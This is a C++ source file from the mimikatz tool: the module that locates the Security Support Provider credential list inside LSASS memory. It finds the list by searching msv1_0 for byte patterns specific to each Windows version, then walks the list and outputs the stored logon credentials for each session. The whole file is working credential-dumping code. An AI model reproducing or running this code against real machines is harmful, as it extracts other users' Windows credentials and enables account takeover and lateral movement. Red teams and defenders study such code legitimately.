/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "ssp.h"
#include "..\..\global.h"
mod_process::PKIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa_ssp::pModMSV = NULL;
mod_mimikatz_sekurlsa_ssp::PKIWI_SSP_CREDENTIAL_LIST_ENTRY mod_mimikatz_sekurlsa_ssp::SspCredentialList = NULL;

bool mod_mimikatz_sekurlsa_ssp::getSSP(vector<wstring> * arguments)
{
	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(getSSPLogonData, wstring(L"ssp")));
	return mod_mimikatz_sekurlsa::getLogonData(arguments, &monProvider);
}

bool mod_mimikatz_sekurlsa_ssp::searchSSPEntryList()
{
#ifdef _M_X64
	BYTE PTRN_WIN5_SspCredentialList[]= {0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
	LONG OFFS_WIN5_SspCredentialList = sizeof(PTRN_WIN5_SspCredentialList) + 4 + 3;
	BYTE PTRN_WIN6_SspCredentialList[]= {0xc7, 0x47, 0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0x89, 0x47, 0x78, 0xff, 0x15};
	LONG OFFS_WIN6_SspCredentialList = sizeof(PTRN_WIN6_SspCredentialList) + 4 + 3;
#elif defined _M_IX86
	BYTE PTRN_WALL_SspCredentialList[]= {0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
	LONG OFFS_WALL_SspCredentialList = sizeof(PTRN_WALL_SspCredentialList) + 4 + 1;
#endif

	if(mod_mimikatz_sekurlsa::searchLSASSDatas() && pModMSV && !SspCredentialList)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;
		pointeur= reinterpret_cast<PBYTE *>(&SspCredentialList);

#ifdef _M_X64
		if(mod_system::GLOB_Version.dwMajorVersion < 6)
		{
			pattern = PTRN_WIN5_SspCredentialList;
			taille = sizeof(PTRN_WIN5_SspCredentialList);
			offset = OFFS_WIN5_SspCredentialList;
		}
		else
		{
			pattern = PTRN_WIN6_SspCredentialList;
			taille = sizeof(PTRN_WIN6_SspCredentialList);
			offset = OFFS_WIN6_SspCredentialList;
		}
#elif defined _M_IX86
		pattern = PTRN_WALL_SspCredentialList;
		taille = sizeof(PTRN_WALL_SspCredentialList);
		offset = OFFS_WALL_SspCredentialList;
#endif
		if(HMODULE monModule = LoadLibrary(L"msv1_0"))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				mod_memory::genericPatternSearch(pointeur, L"msv1_0", pattern, taille, offset);
				*pointeur += pModMSV->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}
	}
	return (SspCredentialList != NULL);
}

bool WINAPI mod_mimikatz_sekurlsa_ssp::getSSPLogonData(__in PLUID logId, __in bool justSecurity)
{
	if(searchSSPEntryList())
	{
		KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
		DWORD monNb = 0;
		if(mod_memory::readMemory(SspCredentialList, &mesCredentials, sizeof(LIST_ENTRY), mod_mimikatz_sekurlsa::hLSASS))
		{
			while(mesCredentials.Flink != SspCredentialList)
			{
				if(mod_memory::readMemory(mesCredentials.Flink, &mesCredentials, sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY), mod_mimikatz_sekurlsa::hLSASS))
				{
					if(RtlEqualLuid(logId, &(mesCredentials.LogonId)))
					{
						mod_mimikatz_sekurlsa::genericCredsToStream(&mesCredentials.credentials, justSecurity, true, &monNb);
						monNb++;
					}
				}
			}
		}
	}
	else (*outputStream) << L"n.a. (SSP KO)";

	return true;
}